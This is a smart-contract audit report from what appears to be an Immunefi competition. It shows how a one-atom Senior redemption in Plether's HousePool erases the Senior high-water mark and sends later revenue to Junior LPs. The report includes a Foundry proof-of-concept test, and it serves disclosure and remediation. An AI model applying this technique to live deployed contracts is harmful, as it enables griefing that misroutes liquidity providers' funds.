# \#100091 [SC-Low] A one-atom Senior redemption erases the Senior high-water mark and routes future restoration value to Junior

**Submitted on Nov 16th 2026 at 08:11:18 UTC by @Nescient for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100091
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

# Description

## Brief/Intro

After a near-total terminal loss leaves exactly one settlement-token atom of Senior principal, a normal Senior LP redemption can fund that one atom and erase the entire Senior high-water mark. The remaining Senior seed shares stay outstanding, but the protocol records no Senior restoration entitlement. Subsequent revenue therefore accrues to Junior instead of first restoring Senior.

The PoC passes 2/2 against the frozen source. It uses the repository's MockSettlementToken burn only to model the terminal near-total loss; it does not claim that a public trading sequence creating exactly one atom has been found.

This is a separate root from N-005. N-005 resets the HWM in the bootstrap branch during a recapitalization/reconcile sequence. This issue reaches `scaleSeniorOnWithdraw` through the ordinary redemption path and requires no queued recapitalization.

## Vulnerability Details

**1. Senior HWM scaling uses funded assets as the ownership fraction.** In `HousePoolWaterfallAccountingLib.scaleSeniorOnWithdraw`:

```solidity
nextState.seniorHighWaterMark -= Math.mulDiv(
    state.seniorHighWaterMark, fundedAssets, state.seniorPrincipal, Math.Rounding.Floor
);
nextState.seniorPrincipal -= fundedAssets;
```

The intended calculation is:

```
HWM' = HWM - floor(HWM * fundedAssets / seniorPrincipal)
```

**2. Virtual ERC-4626 offsets make the one-atom boundary reachable.** `HousePoolRedemptionMathLib.netAssetsForShares` prices a redemption as:

```
floor(shares * (principal + 1) / (supply + 1000))
```

before the exit fee. With `seniorPrincipal = 1`, a Senior LP can redeem all non-seed shares and receive exactly one asset atom. The seed shares remain outstanding, but the withdrawal computes:

```
floor(HWM * 1 / 1) = HWM
```

The result is `seniorPrincipal = 0` and `seniorHighWaterMark = 0`.

**3. The wiped HWM changes future revenue ownership.** `HousePoolWaterfallAccountingLib.distributeRevenue` restores Senior while `seniorPrincipal < seniorHighWaterMark`, then credits the remainder to Junior. Once the HWM is zero, the same revenue goes directly to Junior.

## Impact Details

- A remaining Junior LP receives revenue that should first restore the Senior HWM.
- The harm can be large relative to the one-atom payout because the erased HWM can be much larger than one atom.
- The release-path PoC proves the endpoint through public asynchronous vault redemption and LP settlement calls, but the terminal one-atom loss is modeled with a test-only token burn.
- Because the near-total-loss precondition is not shown as a public attacker-created production state, the finding is Low at most. It is not a demonstrated direct theft of currently claimable funds.

## Recommendation

Do not scale the entire Senior HWM from the asset payout when Senior seed shares or other Senior shares remain outstanding. Tie HWM entitlement to the same share fraction that remains after the redemption, or preserve the HWM for surviving Senior shares with an explicit one-atom boundary rule.

Add regression coverage for:

- `seniorPrincipal = 1`, non-zero HWM, and one-atom Senior redemption;
- virtual seed shares remaining after the redemption;
- subsequent revenue restoring Senior rather than accruing to Junior.

# References

- [`HousePoolWaterfallAccountingLib.scaleSeniorOnWithdraw`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L112-L131)
- [`HousePoolWaterfallAccountingLib.distributeRevenue`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L133-L159)
- [`HousePoolRedemptionMathLib.netAssetsForShares`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolRedemptionMathLib.sol#L20-L48)
- [Senior redemption settlement in `HousePool`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L844-L864)
- [`TrancheVault.requestRedeem`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L631)
- [N-005 comparison report](https://github.com/invalidatoors/2026-11-plether-findings/blob/main/submitted_reports/invalidatoors/N-005.md)

## Proof of Concept

# Proof of Concept

Save the following file as `packages/perps/test/perps/regression/SeniorHwmTinyPrincipal.t.sol`:

```sh
forge test --root packages/perps --match-path test/perps/regression/SeniorHwmTinyPrincipal.t.sol -vv
```

Expected result:

```
Ran 2 tests
2 passed; 0 failed
```

The release-path test funds both tranches through the asynchronous vault flow, matures a Junior redemption so the loss settlement has real work, burns all but one MockSettlementToken atom, settles the loss, then requests all non-seed Senior shares through `TrancheVault.requestRedeem`. It observes a one-atom claimable payout, `seniorPrincipal = 0`, and `seniorHighWaterMark = 0`.

The second test calls the production waterfall helper as a control: an intact HWM sends revenue to Senior; the wiped HWM sends the same revenue to Junior.

No live deployment, RPC, `vm.store`, or impersonation of an in-scope contract is used.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePoolWaterfallAccountingLib} from "@plether/perps/libraries/HousePoolWaterfallAccountingLib.sol";

/// @notice Release-path reproduction of the tiny-principal HWM scaling bug.
/// @dev The mock settlement token burn is the repository's established model for a terminal pool loss.
contract SeniorHwmTinyPrincipalPoC is BasePerpTest {
    address internal constant SENIOR_LP = address(0xA1175);
    address internal constant JUNIOR_LP = address(0xA1176);

    uint256 internal constant SENIOR_ASSETS = 10_000_000e6;
    uint256 internal constant JUNIOR_ASSETS = 10_000_000e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function test_OneAtomSeniorPrincipalRedemptionClearsWholeHwm() public {
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundJunior(JUNIOR_LP, JUNIOR_ASSETS);
        _fundSenior(SENIOR_LP, SENIOR_ASSETS);

        uint256 hwmBeforeLoss = pool.seniorHighWaterMark();
        assertGt(hwmBeforeLoss, 1e6);

        // A matured request gives settleLpEpoch work to do after the burn. The
        // request is fully refunded because the Junior quote is zero.
        (uint256 juniorRequestId,) = _requestAllJunior();

        // Model a terminal near-total loss while preserving exactly one USDG atom of canonical pool assets.
        settlementToken.burn(address(pool), pool.rawAssets() - 1);
        _warpToLpEpoch(juniorRequestId);
        _settleLpEpochForTest();
        _claimJuniorRefund(juniorRequestId);

        assertEq(pool.totalAssets(), 1);
        assertEq(pool.juniorPrincipal(), 0);
        assertEq(pool.seniorPrincipal(), 1);
        // Settlement can add the configured carry before the loss is applied;
        // the important precondition is that a large non-zero HWM survives.
        uint256 hwmAtTinyState = pool.seniorHighWaterMark();
        assertGt(hwmAtTinyState, hwmBeforeLoss);
        assertGt(hwmAtTinyState, 1e6);

        uint256 supply = seniorVault.totalSupply();
        uint256 redeemShares = seniorVault.maxRequestRedeem(SENIOR_LP);
        assertLt(redeemShares, supply, "the virtual seed shares must remain outstanding");

        vm.warp(seniorVault.lastDepositTime(SENIOR_LP) + seniorVault.DEPOSIT_COOLDOWN());
        vm.prank(SENIOR_LP);
        uint256 requestId = seniorVault.requestRedeem(redeemShares, SENIOR_LP, SENIOR_LP);
        vm.warp(seniorVault.depositEpochStart(requestId));
        _settleLpEpochForTest();

        assertEq(seniorVault.claimableRedeemAssets(requestId, SENIOR_LP), 1);
        assertEq(pool.seniorPrincipal(), 0);
        assertEq(pool.seniorHighWaterMark(), 0, "one atom of principal wipes the entire HWM");
    }

    function test_WipedHwmRoutesSubsequentRevenueToJunior() public pure {
        uint256 revenue = 1e6;
        HousePoolWaterfallAccountingLib.WaterfallState memory intact = HousePoolWaterfallAccountingLib.WaterfallState({
            seniorPrincipal: 0,
            juniorPrincipal: 0,
            seniorHighWaterMark: 100e6
        });
        HousePoolWaterfallAccountingLib.WaterfallState memory wiped = HousePoolWaterfallAccountingLib.WaterfallState({
            seniorPrincipal: 0,
            juniorPrincipal: 0,
            seniorHighWaterMark: 0
        });

        intact = HousePoolWaterfallAccountingLib.distributeRevenue(intact, revenue);
        wiped = HousePoolWaterfallAccountingLib.distributeRevenue(wiped, revenue);

        assertEq(intact.seniorPrincipal, revenue, "an intact HWM restores Senior first");
        assertEq(intact.juniorPrincipal, 0);
        assertEq(wiped.seniorPrincipal, 0);
        assertEq(wiped.juniorPrincipal, revenue, "a wiped HWM sends the same revenue to Junior");
    }

    function _requestAllJunior() internal returns (uint256 requestId, uint256 shares) {
        uint256 ready = juniorVault.lastDepositTime(JUNIOR_LP) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < ready) vm.warp(ready);
        shares = juniorVault.balanceOf(JUNIOR_LP);
        assertGt(shares, 0);
        vm.prank(JUNIOR_LP);
        requestId = juniorVault.requestRedeem(shares, JUNIOR_LP, JUNIOR_LP);
    }

    function _warpToLpEpoch(uint256 requestId) internal {
        uint256 maturity = pool.lpEpochStart(requestId);
        if (block.timestamp < maturity) vm.warp(maturity);
    }

    function _claimJuniorRefund(uint256 requestId) internal returns (uint256 shares) {
        shares = juniorVault.refundableRedeemRequest(requestId, JUNIOR_LP);
        assertGt(shares, 0, "zero-quote epoch must return the Junior shares");
        vm.prank(JUNIOR_LP);
        uint256 returnedShares = juniorVault.claimRedeemRefund(requestId, JUNIOR_LP, JUNIOR_LP);
        assertEq(returnedShares, shares);
    }
}
```

